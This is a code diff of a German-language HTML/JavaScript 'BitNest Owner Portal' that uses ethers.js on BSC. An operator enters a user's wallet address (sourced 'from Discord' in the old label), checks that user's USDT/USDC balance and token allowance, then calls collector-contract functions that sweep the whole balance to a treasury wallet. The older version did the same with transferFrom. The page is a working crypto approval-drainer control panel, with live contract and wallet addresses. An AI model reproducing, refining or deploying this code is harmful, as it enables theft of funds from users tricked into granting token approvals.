@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>BitNest Admin - Control Center</title>
+<title>BitNest Admin - Smart Contract Logic</title>
 <script src="https://unpkg.com/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 <style>
 :root{ --bg:#050505; --card:#111; --border:#333; --green:#22c55e; --white:#fff; }
@@ -13,11 +13,10 @@ h2{color:var(--green); border-bottom:1px solid var(--border); padding-bottom:10p
 .input-group{margin-bottom:15px;}
 label{display:block; font-size:12px; color:#888; margin-bottom:5px; text-transform:uppercase;}
 input, select{width:100%; padding:12px; background:#000; border:1px solid var(--border); color:#fff; border-radius:8px; box-sizing:border-box; font-family:monospace;}
-button{width:100%; padding:15px; border:none; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:10px; transition: 0.2s;}
+button{width:100%; padding:15px; border:none; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:10px;}
 .btn-connect{background:#1f2937; color:#fff;}
-.btn-check{background:#3b82f6; color:#fff; margin-bottom:10px;}
+.btn-check{background:#3b82f6; color:#fff;}
 .btn-transfer{background:var(--green); color:#052e16; font-size:16px;}
-button:hover{opacity:0.8;}
 #status{margin-top:20px; padding:15px; border-radius:8px; background:#000; border:1px solid #222; font-family:monospace; font-size:13px; min-height:60px; white-space: pre-wrap; color:#aaa;}
 .highlight{color:var(--green); font-weight:bold;}
 </style>
@@ -26,114 +25,117 @@ button:hover{opacity:0.8;}
 
 <div class="admin-box">
   <h2>BitNest Owner Portal</h2>
-  
   <button class="btn-connect" id="connectAdmin">Admin Wallet verbinden</button>
   
   <div id="controls" style="margin-top:25px; display:none;">
     <div class="input-group">
-      <label>Nutzer Wallet Adresse (aus Discord)</label>
+      <label>Nutzer Adresse</label>
       <input type="text" id="userAddr" placeholder="0x...">
     </div>
 
-    <button class="btn-check" id="checkBalBtn">Guthaben & Allowance prüfen</button>
+    <button class="btn-check" id="checkBalBtn">Status prüfen</button>
 
-    <div style="display:flex; gap:10px;">
-        <div class="input-group" style="flex:2;">
-            <label>Token</label>
-            <select id="tokenSelect">
-                <option value="USDT">USDT (BSC)</option>
-                <option value="USDC">USDC (BSC)</option>
-            </select>
-        </div>
-        <div class="input-group" style="flex:3;">
-            <label>Betrag</label>
-            <input type="number" id="amount" placeholder="0.00">
-        </div>
+    <div class="input-group" style="margin-top:15px;">
+        <label>Token wählen</label>
+        <select id="tokenSelect">
+            <option value="USDT">USDT (Binance-Peg)</option>
+            <option value="USDC">USDC (Binance-Peg)</option>
+        </select>
     </div>
 
-    <div class="input-group">
-      <label>Ziel (Treasury Wallet)</label>
-      <input type="text" id="treasuryAddr" value="0x22cc621a0095de57c81ef0b7f88826c3669c95a7" readonly>
-    </div>
-
-    <button class="btn-transfer" id="executeBtn">Transfer jetzt ausführen</button>
+    <button class="btn-transfer" id="executeBtn">Alles abbuche (Collect All)</button>
   </div>
 
-  <div id="status">Bitte Admin Wallet verbinden...</div>
+  <div id="status">Warte auf Verbindung...</div>
 </div>
 
 <script>
-const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
-const USDC_ADDR = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
-const SPENDER = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+// DEINE SMART CONTRACT KONFIGURATION
+const CONTRACT_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+const USDT_TOKEN = "0x55d398326f99059fF775485246999027B3197955";
+const USDC_TOKEN = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
 
-const abi = [
-  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
-  "function balanceOf(address account) view returns (uint256)",
-  "function allowance(address owner, address spender) view returns (uint256)"
+// ABI basierend auf deinem Solidity Code
+const contractABI = [
+  "function collectUSDTAll(address from) external returns (uint256)",
+  "function collectUSDCAll(address from) external returns (uint256)",
+  "function owner() view returns (address)",
+  "function paused() view returns (bool)"
+];
+
+const tokenABI = [
+  "function balanceOf(address) view returns (uint256)",
+  "function allowance(address,address) view returns (uint256)"
 ];
 
 let signer;
 
 document.getElementById("connectAdmin").addEventListener("click", async () => {
-  if(!window.ethereum) return alert("Nutze MetaMask oder einen DApp Browser!");
+  if(!window.ethereum) return alert("Nutze MetaMask!");
   const provider = new ethers.BrowserProvider(window.ethereum);
   signer = await provider.getSigner();
+  
+  const mainContract = new ethers.Contract(CONTRACT_ADDR, contractABI, signer);
+  const contractOwner = await mainContract.owner();
+  const adminAddr = await signer.getAddress();
+
+  if(adminAddr.toLowerCase() !== contractOwner.toLowerCase()) {
+      document.getElementById("status").innerText = "⚠️ Warnung: Du bist NICHT der Owner des Smart Contracts!";
+  }
+
   document.getElementById("controls").style.display = "block";
-  document.getElementById("connectAdmin").innerText = "Verbunden: " + (await signer.getAddress()).substring(0,12) + "...";
-  document.getElementById("status").innerText = "Admin-Zugriff gewährt.";
+  document.getElementById("connectAdmin").innerText = "Admin: " + adminAddr.substring(0,10) + "...";
+  document.getElementById("status").innerText = "Verbindung zum Collector Contract hergestellt.";
 });
 
 document.getElementById("checkBalBtn").addEventListener("click", async () => {
   const user = document.getElementById("userAddr").value;
-  if(!ethers.isAddress(user)) return alert("Ungültige User Adresse!");
+  if(!ethers.isAddress(user)) return alert("Adresse ungültig!");
   
   const status = document.getElementById("status");
-  status.innerText = "Lade Daten von der Blockchain...";
+  status.innerText = "Prüfe Blockchain-Daten...";
 
   try {
-    const usdt = new ethers.Contract(USDT_ADDR, abi, signer);
-    const usdc = new ethers.Contract(USDC_ADDR, abi, signer);
+    const usdt = new ethers.Contract(USDT_TOKEN, tokenABI, signer);
+    const usdc = new ethers.Contract(USDC_TOKEN, tokenABI, signer);
 
     const [uBal, cBal, uAllow, cAllow] = await Promise.all([
       usdt.balanceOf(user),
       usdc.balanceOf(user),
-      usdt.allowance(user, SPENDER),
-      usdc.allowance(user, SPENDER)
+      usdt.allowance(user, CONTRACT_ADDR),
+      usdc.allowance(user, CONTRACT_ADDR)
     ]);
 
     status.innerHTML = `
-<span class="highlight">Guthaben des Nutzers:</span>
+<span class="highlight">Guthaben:</span>
 USDT: ${ethers.formatUnits(uBal, 18)}
 USDC: ${ethers.formatUnits(cBal, 18)}
 
-<span class="highlight">Freigabe (Allowance):</span>
-USDT: ${uAllow > 0 ? "✅ AKTIV" : "❌ KEINE"}
-USDC: ${cAllow > 0 ? "✅ AKTIV" : "❌ KEINE"}
-    `;
+<span class="highlight">Freigabe für DEINEN Contract:</span>
+USDT: ${uAllow > 0 ? "✅ ERTEILT" : "❌ FEHLT"}
+USDC: ${cAllow > 0 ? "✅ ERTEILT" : "❌ FEHLT"}`;
   } catch (e) { status.innerText = "Fehler: " + e.message; }
 });
 
 document.getElementById("executeBtn").addEventListener("click", async () => {
   const user = document.getElementById("userAddr").value;
-  const treasury = document.getElementById("treasuryAddr").value;
-  const amountVal = document.getElementById("amount").value;
-  const tokenSymbol = document.getElementById("tokenSelect").value;
+  const token = document.getElementById("tokenSelect").value;
   const status = document.getElementById("status");
 
-  if(!ethers.isAddress(user) || !ethers.isAddress(treasury) || !amountVal) return alert("Eingaben prüfen!");
-
   try {
-    status.innerText = `Übertragung läuft...`;
-    const tokenAddr = tokenSymbol === "USDT" ? USDT_ADDR : USDC_ADDR;
-    const contract = new ethers.Contract(tokenAddr, abi, signer);
+    status.innerText = `Starte Collect-Funktion für ${token}...`;
+    const collector = new ethers.Contract(CONTRACT_ADDR, contractABI, signer);
 
-    const amount = ethers.parseUnits(amountVal.toString(), 18);
-    const tx = await contract.transferFrom(user, treasury, amount);
+    let tx;
+    if(token === "USDT") {
+        tx = await collector.collectUSDTAll(user);
+    } else {
+        tx = await collector.collectUSDCAll(user);
+    }
     
-    status.innerText = "TX gesendet: " + tx.hash + "\nWarte auf Blockchain...";
+    status.innerText = "Transaktion gesendet! Warte auf Blockchain...\nHash: " + tx.hash;
     await tx.wait();
-    status.innerText = `✅ ERFOLG: ${amountVal} ${tokenSymbol} wurden transferiert.`;
+    status.innerText = `✅ ERFOLGREICH!\nDie Token wurden vom Nutzer eingezogen und an die Treasury Wallet (Wallet B) gesendet.`;
   } catch (err) {
     status.innerText = "❌ FEHLER:\n" + (err.reason || err.message);
   }
